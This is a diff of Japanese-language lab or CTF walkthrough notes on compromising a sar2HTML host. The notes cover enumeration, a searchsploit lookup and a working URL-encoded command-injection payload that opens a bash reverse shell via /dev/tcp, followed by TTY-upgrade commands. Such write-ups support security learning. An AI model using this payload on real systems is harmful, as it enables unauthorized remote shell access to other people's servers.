@@ -12,13 +12,17 @@
 
 
 ## 攻略
-- `gobuster dir -u $IP -w $dirsmall`
+- nmap
+  - 80のみ 
+- `gobuster dir -u $IP -x php,html -w $dirsmall`
+  - これからは`-x`をつける。辞書が大きくないので、拡張子をつけてもたいして時間は変わらない 
   - phpinfo.php,robots.txt 
 - phpinfo.php
-  - サーバのいろんな情報がわかる  
+  - サーバのいろんな情報がわかる。この中でも一番大事そうなのは一番上のSystem Linux 5.0.0-23 Ubuntu x86_64だとわかる
 - robots.txt
   - /sar2HTMLという謎の文字があるが、これはディレクトリっぽいのでサイトを見てみる
 - sar2htmlをネットで検索すると、どうもシステム情報を統計的に表示させるソフトらしい。exploitを検索する。
+- msfonsoleだと何も出てこない。なぜかはわからん
 - `searchsploit sar2HTML`
 - `searchsploit -x 47204.txt` 
   - metasploitの実行ファイルでないのでcodeがなくosコマンンドインジェクションができる説明書
@@ -31,7 +35,12 @@
   - `http://192.168.56.104/sar2HTML/index.php?plot=;bash+-c+%27exec+bash+-i+%26%3E%2Fdev%2Ftcp%2F192.168.56.104%2F9001+%3C%261%27`
   - ブラウザのURLのリンクに貼り付ける。スペースがないように気をつける
 
-- 対話シェルにする
+- 完全な対話シェルにする
+  - `python -c 'import pty;pty.spawn("/bin/bash")'`
+  - `export TERM=xterm`
+  - ctrl + z
+  - `stty raw -echo ; fg`
+  - `stty rows 38 columns 115` 
 - id
   - www-dataのみ 
   - www-dataなのでsudo -lは期待できない。パスワードが必要
